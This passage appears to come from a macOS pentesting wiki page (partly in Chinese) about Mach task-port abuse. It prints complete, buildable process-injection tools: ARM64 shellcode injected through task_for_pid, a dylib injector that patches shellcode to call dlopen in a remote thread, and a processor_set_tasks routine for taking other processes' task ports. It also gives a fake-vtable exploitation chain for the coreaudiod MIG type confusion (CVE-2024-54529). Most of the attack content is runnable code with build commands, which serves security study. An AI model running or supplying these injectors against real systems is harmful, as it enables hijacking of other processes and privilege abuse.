// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> 要在 iOS 上使此方法生效，你需要权限 `dynamic-codesigning`，以便将可写内存设置为可执行。

### Dylib Injection 在线程中通过 Task port

在 macOS 中，**threads** 可以通过 **Mach** 操作，或者使用 **posix `pthread` api**。我们在之前注入中生成的线程是使用 Mach api 生成的，所以**它不符合 posix**。

之所以能够**注入一个简单的 shellcode**来执行命令，是因为它**不需要与 posix 合规的 api 一起工作**，只需要 Mach。**更复杂的注入**则需要该**thread** 也**符合 posix**。

因此，为了**改进该 thread**，它应调用 **`pthread_create_from_mach_thread`**，该函数会**创建一个有效的 pthread**。然后，这个新的 pthread 可以**调用 dlopen** 从系统**加载一个 dylib**，这样就可以不用编写新的 shellcode 来执行不同操作，而是加载自定义库。

你可以在以下位置找到**示例 dylibs**（例如，可以生成日志然后监听它的那个）：

{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

在此技术中，会劫持该进程的一个线程：

{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

调用 `task_for_pid` 或 `thread_create_*` 时，会增加内核中 struct task 的计数器，该计数器可以通过在用户态调用 task_info(task, TASK_EXTMOD_INFO, ...) 访问。

## 异常端口

当线程发生异常时，该异常会发送到线程指定的异常端口。如果线程未处理，则会发送到 task 的异常端口。如果 task 也未处理，则会发送到由 launchd 管理的 host 端口（在那儿会被确认）。这称为异常分流。

注意，如果最终未被适当处理，报告通常会由 ReportCrash 守护进程处理。不过，同一 task 中的另一个线程也可能处理该异常，这正是像 `PLCreashReporter` 这类崩溃上报工具所做的。

## 其他对象

### 时钟

任何用户都可以访问关于时钟的信息，但要设置时间或修改其他设置必须具有 root 权限。

要获取信息，可以调用 `clock` 子系统的函数，例如：`clock_get_time`、`clock_get_attributtes` 或 `clock_alarm`\  
要修改值，可以使用 `clock_priv` 子系统的函数，例如 `clock_set_time` 和 `clock_set_attributes`

### 处理器与处理器集

processor API 允许控制单个逻辑处理器，可调用的函数包括 `processor_start`、`processor_exit`、`processor_info`、`processor_get_assignment` 等...

此外，**processor set** API 提供了一种将多个处理器分组的方法。可以通过调用 **`processor_set_default`** 来检索默认的 processor set。\  
以下是一些与 processor set 交互的有趣 API：

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

如 [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/) 所述，过去这允许通过调用 **`processor_set_tasks`** 绕过前面提到的保护，从而在其他进程中获取 task port 并控制它们，甚至在每个进程上获取 host port。\  
如今需要 root 权限才能使用该函数，且该功能受到保护，因此你只能在未受保护的进程上获取这些端口。

你可以用以下方式尝试：

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; 通过 vtable 槽进行间接调用
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
